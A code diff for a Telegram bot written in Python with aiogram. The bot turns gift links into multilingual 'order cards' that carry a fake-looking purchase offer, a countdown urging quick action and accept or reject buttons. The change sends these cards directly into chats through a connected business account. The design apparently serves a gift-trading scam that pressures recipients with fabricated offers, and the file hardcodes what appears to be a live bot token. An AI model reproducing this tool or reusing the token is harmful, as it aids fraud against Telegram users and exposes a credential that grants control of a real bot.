@@ -12,8 +12,7 @@ from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.types import (  
     Message, CallbackQuery, BusinessConnection,  
     InlineKeyboardMarkup, InlineKeyboardButton,  
-    ReplyKeyboardMarkup, KeyboardButton,  
-    InlineQueryResultArticle, InputTextMessageContent  
+    ReplyKeyboardMarkup, KeyboardButton  
 )  
   
 BOT_TOKEN = "9111963048:AAHem8wQwJiU5mkeoob_3KtmPRP8sGtYtmM"  
@@ -25,11 +24,12 @@ active_business_chats = {}
 
 LANGS = {
     "ru": {
-        "welcome": "🏦 <b>{brand}</b>\n\nОтправь мне текст со ссылкой на подарок (например: <i>Пользователь хочет купить ваш подарок за 3000 ⭐ https://t.me/nft/DeskCalendar-84640</i>), и я сделаю карточку!",
+        "welcome": "🏦 <b>{brand}</b>\n\nОтправь мне текст со ссылкой на подарок, и я сразу сформирую карточку ордера!",
         "menu_create": "🤝 Создать сделку",
         "menu_lang": "🌍 Язык: Русский",
         "menu_chats": "📂 Мои чаты",
-        "btn_publish": "📤 Отправить карточку ордера",
+        "btn_publish": "📤 Отправить: {name}",
+        "btn_publish_self": "📤 Отправить карточку ордера",
         "btn_delete": "❌ Удалить ордер",
         "timer_text": "⏳ <b>Предложение активно ещё {timer}</b>",
         "btn_show": "🎁 ПОКАЗАТЬ ПОДАРОК",
@@ -43,11 +43,12 @@ LANGS = {
         "choose_lang": "🌐 Выберите язык / Choose language / 选择语言:"
     },
     "en": {
-        "welcome": "🏦 <b>{brand}</b>\n\nSend me the text with the gift link, and I'll create the card!",
+        "welcome": "🏦 <b>{brand}</b>\n\nSend me the text with the gift link, and I'll create the order card!",
         "menu_create": "🤝 Create Deal",
         "menu_lang": "🌍 Language: English",
         "menu_chats": "📂 My Chats",
-        "btn_publish": "📤 Send order card",
+        "btn_publish": "📤 Send: {name}",
+        "btn_publish_self": "📤 Send order card",
         "btn_delete": "❌ Delete order",
         "timer_text": "⏳ <b>Offer active for {timer} more</b>",
         "btn_show": "🎁 SHOW GIFT",
@@ -61,11 +62,12 @@ LANGS = {
         "choose_lang": "🌐 Choose language / Выберите язык / 选择语言:"
     },
     "zh": {
-        "welcome": "🏦 <b>{brand}</b>\n\n发送带有礼物链接的文本，我将创建卡片！",
+        "welcome": "🏦 <b>{brand}</b>\n\n发送带有礼物链接的文本，我将创建订单卡片！",
         "menu_create": "🤝 创建交易",
         "menu_lang": "🌍 语言: 中文",
         "menu_chats": "📂 我的聊天",
-        "btn_publish": "📤 发送订单卡片",
+        "btn_publish": "📤 发送给: {name}",
+        "btn_publish_self": "📤 发送订单卡片",
         "btn_delete": "❌ 删除订单",
         "timer_text": "⏳ <b>优惠有效时间还剩 {timer}</b>",
         "btn_show": "🎁 查看礼物",
@@ -239,11 +241,17 @@ async def handle_deal_creation_text(msg: Message):
     conn.commit()  
     conn.close()
 
-    # Нативная кнопка вызова списка пользователей через switch_inline_query
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text=t["btn_publish"], switch_inline_query=f"deal_{code}")],
-        [InlineKeyboardButton(text=t["btn_delete"], callback_data=f"sel_reject_{code}")]
-    ])
+    # Кнопки отправки ордера по подключенным бизнес-чатам или в этот же чат
+    send_buttons = []
+    if active_business_chats:
+        for cid, name in active_business_chats.items():
+            send_buttons.append([InlineKeyboardButton(text=t["btn_publish"].format(name=name), callback_data=f"sendtochat_{code}_{cid}")])
+    else:
+        send_buttons.append([InlineKeyboardButton(text=t["btn_publish_self"], callback_data=f"sendtochat_{code}_{msg.from_user.id}")])
+
+    send_buttons.append([InlineKeyboardButton(text=t["btn_delete"], callback_data=f"sel_reject_{code}")])
+
+    kb = InlineKeyboardMarkup(inline_keyboard=send_buttons)
 
     preview_text = (
         f"{text_content}\n\n"
@@ -257,83 +265,59 @@ async def handle_deal_creation_text(msg: Message):
         disable_web_page_preview=False
     )
 
-@router.inline_query()
-async def inline_deal_query(query):
-    text = query.query.strip()
-    if text.startswith("deal_"):
-        code = text.replace("deal_", "")
-        deal = get_deal(code)
-        if deal:
-            custom_text = deal[4]
-            gift_link = deal[5]
-            
-            content = (
-                f"{custom_text}\n\n"
-                f"Telegram\n<a href=\"{gift_link}\">Подарок</a>"
-            )
-            
-            lang = get_user_lang(query.from_user.id)
-            t = LANGS[lang]
-            
-            kb = InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text=t["btn_show"], url=gift_link)],
-                [
-                    InlineKeyboardButton(text=t["btn_reject"], callback_data=f"sel_reject_{code}"),
-                    InlineKeyboardButton(text=t["btn_accept"], callback_data=f"sel_accept_{code}")
-                ]
-            ])
-            
-            results = [
-                InlineQueryResultArticle(
-                    id=code,
-                    title="📤 Отправить карточку ордера",
-                    description="Нажмите, чтобы отправить этот ордер выбранному пользователю",
-                    input_message_content=InputTextMessageContent(
-                        message_text=content,
-                        parse_mode="HTML",
-                        disable_web_page_preview=False
-                    ),
-                    reply_markup=kb
-                )
-            ]
-            await query.answer(results, cache_time=1)
+@router.callback_query(F.data.startswith("sendtochat_"))
+async def send_to_chat(cb: CallbackQuery):
+    parts = cb.data.split("_")
+    code = parts[1]
+    target_chat_id = int(parts[2])
+    
+    deal = get_deal(code)
+    if not deal:
+        await cb.answer(LANGS[get_user_lang(cb.from_user.id)]["order_not_found"], show_alert=True)
+        return
+
+    lang = get_user_lang(cb.from_user.id)
+    t = LANGS[lang]
+
+    custom_text = deal[4]
+    gift_link = deal[5]
+
+    text_msg = (
+        f"{custom_text}\n\n"
+        f"Telegram\n<a href=\"{gift_link}\">Подарок</a>"
+    )
+
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text=t["btn_show"], url=gift_link)],
+        [
+            InlineKeyboardButton(text=t["btn_reject"], callback_data=f"sel_reject_{code}"),
+            InlineKeyboardButton(text=t["btn_accept"], callback_data=f"sel_accept_{code}")
+        ]
+    ])
+
+    if active_business_connection_id:
+        await cb.bot.send_message(
+            chat_id=target_chat_id,
+            text=text_msg,
+            parse_mode="HTML",
+            reply_markup=kb,
+            disable_web_page_preview=False,
+            business_connection_id=active_business_connection_id
+        )
     else:
-        # Если строка пустая в инлайне, показываем актуальные созданные сделки пользователя
-        conn = sqlite3.connect(DB_PATH)
-        rows = conn.execute("SELECT code, custom_text, gift_link FROM deals WHERE creator_id=? AND status='pending' ORDER BY id DESC LIMIT 5", (query.from_user.id,)).fetchall()
-        conn.close()
+        await cb.bot.send_message(
+            chat_id=target_chat_id,
+            text=text_msg,
+            parse_mode="HTML",
+            reply_markup=kb,
+            disable_web_page_preview=False
+        )
 
-        results = []
-        lang = get_user_lang(query.from_user.id)
-        t = LANGS[lang]
-
-        for r in rows:
-            code, custom_text, gift_link = r[0], r[1], r[2]
-            content = (
-                f"{custom_text}\n\n"
-                f"Telegram\n<a href=\"{gift_link}\">Подарок</a>"
-            )
-            kb = InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text=t["btn_show"], url=gift_link)],
-                [
-                    InlineKeyboardButton(text=t["btn_reject"], callback_data=f"sel_reject_{code}"),
-                    InlineKeyboardButton(text=t["btn_accept"], callback_data=f"sel_accept_{code}")
-                ]
-            ])
-            results.append(
-                InlineQueryResultArticle(
-                    id=code,
-                    title=f"Ордер #{code}",
-                    description=custom_text[:50],
-                    input_message_content=InputTextMessageContent(
-                        message_text=content,
-                        parse_mode="HTML",
-                        disable_web_page_preview=False
-                    ),
-                    reply_markup=kb
-                )
-            )
-        await query.answer(results, cache_time=1)
+    try:
+        await cb.message.edit_reply_markup(reply_markup=None)
+    except Exception:
+        pass
+    await cb.answer(t["order_sent"])
 
 @router.callback_query(F.data.startswith("sel_accept_"))
 async def sel_accept(cb: CallbackQuery):
